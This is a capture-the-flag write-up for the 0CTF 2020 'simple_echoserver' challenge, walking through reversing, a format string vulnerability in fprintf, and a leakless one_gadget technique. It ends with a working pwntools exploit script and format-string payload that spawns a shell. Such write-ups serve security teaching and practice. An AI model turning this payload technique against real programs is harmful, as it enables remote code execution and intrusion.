---
layout: "post"
title: "Writeup for Simple Echo Server 0ctf 2020"
date: 2020-7-02
tags: [Format Strings, CTF]
---

We had great time playing this year's edition of 0CTF 2020. I was mostly working on the challenge **simple\_echoserver** which was a fairly simple stack based challenge, but required lot of brute forcing. Sadly , we couldn't hit the bruteforce on server. Nevertheless , here's the intended solution for the challenge.

## TL;DR OF THE CHALLENGE BINARY

We've been provided with standard *x86 64-bit Dynamically Linked* binary along with *glibc 2.27* to start with.

Here's what **checksec** has to say -

```py
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

Let's reverse this now.

## REVERSING

The binary is a fairly simple one asking us for **name** and **phone number** which it stores on stack and then performs **fprintf** of name through stderr. An important thing to note is that *stderr is being directed to /dev/null* on server and hence the binary won't print out name , thereby preventing leaks.

The bug lies in the fprintf where we encounter the infamous **Format String Vulnerability**.

The function asking for Details ->

```c
 puts("For audit, please provide your name and phone number: ");
  printf("Your name: ");
  read_name((_BYTE *)a1, 256);
  printf("Your phone: ", 256LL);
  result = read_num();
  *(_QWORD *)(a1 + 256) = result;
  return result;

```

This is the function which contains our vulnerable fprintf

```c
 snprintf((char *)0x555555558060LL, 0x100uLL, "[USER] name: %s; phone: %ld\n", a1, *(_QWORD *)(a1 + 256));
  return fprintf(MEMORY[0x555555558040], (const char *)0x555555558060LL);
```

After this , the program loops and echo's whatever we give as input without any vulnerabilities.

```c
    puts("Now enjoy yourself");
    while(1)
    {
        read_name(&s1,256);
        if(!strcmp(&s1,"~."))
            break;
        printf("%s",&s1);
    }
```

## EXPLOIT IDEA AND ANALYSIS

Well , initially we planned to do File Structure overwrite by corrupting stderr's *file_no* field with **1** and calling main again would print leaks. But that method looked very cumbersome as it required lots of bruteforcing.

Hence the intended solution is to pop pyell leaklessly.

Let us notice stack at the instance of calling vulnerable printf.

```py

0000| 0x7fffffffebf8 --> 0x55555555541a (nop)
0008| 0x7fffffffec00 --> 0x0 
0016| 0x7fffffffec08 --> 0x555555558160 --> 0x6161616161 ('aaaaa') ->Input
0024| 0x7fffffffec10 --> 0x7fffffffed30 --> 0x7fffffffed50 --> 0x5555555554e0 (endbr64) ->Main's RBP
0032| 0x7fffffffec18 --> 0x555555555443 (lea    rdi,[rip+0xc5b]        # 0x5555555560a5)
0040| 0x7fffffffec20 --> 0x0 
0048| 0x7fffffffec28 --> 0x0 
0056| 0x7fffffffec30 --> 0x7fffffffed30 --> 0x7fffffffed50 --> 0x5555555554e0 (endbr64)
0064| 0x7fffffffec38 --> 0x7ffff7dcfa00 --> 0xfbad208b 
0072| 0x7fffffffec40 --> 0xd68 ('h\r')
0080| 0x7fffffffec48 --> 0x7ffff7a71148 (<_IO_file_underflow+296>:	test   rax,rax)
0088| 0x7fffffffec50 --> 0xf705fa00 
0096| 0x7fffffffec58 --> 0xffffffffffffffff 
0104| 0x7fffffffec60 --> 0x5555555550f0 (endbr64)
0112| 0x7fffffffec68 --> 0xa ('\n')
0120| 0x7fffffffec70 --> 0x7fffffffed10 --> 0x7fffffffed30 --> 0x7fffffffed50 --> 0x5555555554e0 (endbr64)
0128| 0x7fffffffec78 --> 0x5555555550f0 (endbr64)
0136| 0x7fffffffec80 --> 0x7fffffffee30 --> 0x1 
0144| 0x7fffffffec88 --> 0x0 
0152| 0x7fffffffec90 --> 0x0 
0160| 0x7fffffffec98 --> 0x555555555348 (mov    rcx,QWORD PTR [rbp-0x18])
0168| 0x7fffffffeca0 --> 0x7ffff7dcfa00 --> 0xfbad208b 
0176| 0x7fffffffeca8 --> 0x7fffffffecb3 --> 0xffee300000000000 
0184| 0x7fffffffecb0 --> 0x333231 ('123') -> Phone Number
0192| 0x7fffffffecb8 --> 0x7fffffffee30 --> 0x1 

0208| 0x7fffffffecc8 --> 0x7ffff7a723f2 (<_IO_default_uflow+50>:	cmp    eax,0xffffffff)
0216| 0x7fffffffecd0 --> 0x36 ('6')
0224| 0x7fffffffecd8 --> 0x555555558165 --> 0x0 
0232| 0x7fffffffece0 --> 0x7fffffffed10 --> 0x7fffffffed30 --> 0x7fffffffed50 --> 0x5555555554e0 (endbr64)
0240| 0x7fffffffece8 --> 0x55555555528d (mov    r12d,eax)
0248| 0x7fffffffecf0 --> 0x10055556029 



```

If we close analyse address **0x7fffffffeca8** which also contains a stack pointer **0x7fffffffecb3**, we see that we can control it with the Phone Number that we give as input , so if we give the phone number of *length* **24**  , then we can make that pointer point to a libc address.

```py
0176| 0x7fffffffeca8 --> 0x7fffffffecc8 --> 0x7ffff7a72300 (<_IO_doallocbuf>:	cmp    QWORD PTR [rdi+0x38],0x0)
0184| 0x7fffffffecb0 ('0' <repeats 24 times>) -> Phone Number of length 24
0192| 0x7fffffffecb8 ('0' <repeats 16 times>)
0200| 0x7fffffffecc0 ("00000000")
0208| 0x7fffffffecc8 --> 0x7ffff7a72300 (<_IO_doallocbuf>:	cmp    QWORD PTR [rdi+0x38],0x0)

```

Now that we have a libc address , we now corrupt it to point to one_gadget and pivot stack by corrupting rbp
to point to one_gadget to grant us shell.

After a few attempts , **0xe5863** magic address satisfies and we get shell.

But how do we write one_gadget number of bytes to that address?

We can use `%*` format string which is actually used for picking arguments from stack.

If we can pick arguments from stack , we can add them to constant numbers and get to one_gadget.
{: .notice}

So now the plan is , 

1. Corrupt rbp to point to our supposed one_gadget.
2. Find the difference between the libc address on stack and one_gadget. This is the number of bytes we need to add to our libc address which we will do with `%*`.
3. We calculate the offset and number of bytes to be added and finally use %n to store the result of addition back in the pointer we have to corrupt.


Here's the exploit script.

```py
from pwn import *
import sys

HOST = 'pwnable.org'
PORT = 12020
LIBC = ELF("./libc.so.6",checksec = False)
if(len(sys.argv)>1):
    io=remote(HOST,PORT)
    context.noptrace=True
else:
    io=process('./simple_echoserver',env = {"LD_PRELOAD" : "./libc.so.6"},stderr = open('/dev/null','w+'))

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)
#b*0x5555555554d0

#'%*76$d' + '%73$n')

if __name__=="__main__":
    gdb.attach(io,"""
            b fprintf
            c
            """)
    #rbp is stored at 7th offset , the libc address is stored at offset 30 and the pointer to libc address is stored at 26th offset
    sla("Your name: ", '%3c' + '%7$hhn' + '%357715c' + '%*30$c' + '%26$n')
    sla('phone: ','0'*24) #To get pointer to libc address
    sla('yourself!\n','a')
    sl('~.')
    io.interactive()
```

## CONCLUSION

The challenge has unintended solutions which deal with exploiting **vfprintf** which Ill not be looking into as for now.

Simple challenge with complex tricks , kudos to 0CTF for such a challenge.



